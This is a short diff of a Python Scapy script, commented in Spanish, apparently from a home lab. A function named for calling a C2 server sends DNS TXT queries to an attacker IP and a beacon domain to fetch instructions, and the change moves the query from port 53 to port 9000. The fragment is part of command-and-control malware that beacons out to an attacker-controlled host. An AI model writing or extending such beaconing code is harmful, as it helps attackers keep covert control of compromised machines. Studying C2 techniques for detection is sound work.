@@ -17,7 +17,7 @@ def llamar_al_c2():
     print(f"[*] Solicitando instrucciones a C2 ({IP_ATACANTE}) vía DNS...")
     
     # Petición DNS explícita tipo TXT apuntando a la IP de tu PC
-    paquete_dns = IP(dst=IP_ATACANTE)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=DOMINIO_BEACON, qtype="TXT"))
+    paquete_dns = IP(dst=IP_ATACANTE)/UDP(dport=9000)/DNS(rd=1, qd=DNSQR(qname=DOMINIO_BEACON, qtype="TXT"))
     
     respuesta = sr1(paquete_dns, timeout=5, verbose=0)
     
